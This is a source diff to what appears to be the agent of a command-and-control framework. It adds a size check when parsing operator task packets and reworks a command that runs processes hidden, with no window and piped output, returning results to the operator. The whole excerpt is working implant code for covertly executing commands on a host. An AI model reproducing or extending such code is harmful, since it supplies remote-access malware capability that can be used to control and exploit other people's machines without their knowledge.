@@ -15,6 +15,11 @@ void Commander::ProcessCommandTasks(BYTE* recv, ULONG recvSize, Packer* outPacke
 	*inPacker = Packer( recv, recvSize );
 
 	ULONG packerSize = inPacker->Unpack32();
+	if (packerSize > recvSize - 4) {
+		MemFreeLocal((LPVOID*)&inPacker, sizeof(Packer));
+		return;
+	}
+
 	while ( packerSize + 4 > inPacker->datasize())
 	{	
 		ULONG CommandId = inPacker->Unpack32();
@@ -753,14 +758,12 @@ void Commander::CmdPsRun(ULONG commandId, Packer* inPacker, Packer* outPacker)
 {
 	BOOL  progOutput   = inPacker->Unpack8();
 	BOOL  progState    = inPacker->Unpack32();
-	ULONG progSize     = 0;
-	CHAR* prog         = (CHAR*)inPacker->UnpackBytes(&progSize);
 	ULONG progArgsSize = 0;
 	CHAR* progArgs     = (CHAR*)inPacker->UnpackBytes(&progArgsSize);
 	ULONG taskId       = inPacker->Unpack32();
 
-	PROCESS_INFORMATION pi = { 0 };
-	STARTUPINFOA spi = { 0 };
+	PROCESS_INFORMATION pi  = { 0 };
+	STARTUPINFOA        spi = { 0 };
 	spi.cb          = sizeof(STARTUPINFOA);
 	spi.dwFlags     = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
 	spi.wShowWindow = SW_HIDE;
@@ -776,7 +779,8 @@ void Commander::CmdPsRun(ULONG commandId, Packer* inPacker, Packer* outPacker)
 		spi.hStdInput  = NULL;
 	}
 
-	BOOL result = ApiWin->CreateProcessA(prog, progArgs, NULL, NULL, TRUE, progState | CREATE_NO_WINDOW, NULL, NULL, &spi, &pi);
+	BOOL result = ApiWin->CreateProcessA(NULL, progArgs, NULL, NULL, TRUE, progState | CREATE_NO_WINDOW, NULL, NULL, &spi, &pi);
+
 	if (result) {
 		JobData job = agent->jober->CreateJobData(taskId, JOB_TYPE_PROCESS, JOB_STATE_RUNNING, pi.hProcess, pi.dwProcessId, pipeRead, pipeWrite);
 
@@ -784,7 +788,7 @@ void Commander::CmdPsRun(ULONG commandId, Packer* inPacker, Packer* outPacker)
 		outPacker->Pack32(commandId);
 		outPacker->Pack32(job.pidObject);
 		outPacker->Pack8(progOutput);
-		outPacker->PackBytes((PBYTE)prog, progSize);
+		outPacker->PackBytes((PBYTE)progArgs, progArgsSize);
 
 		ApiNt->NtClose(pi.hThread);
 		pi.hThread = NULL;
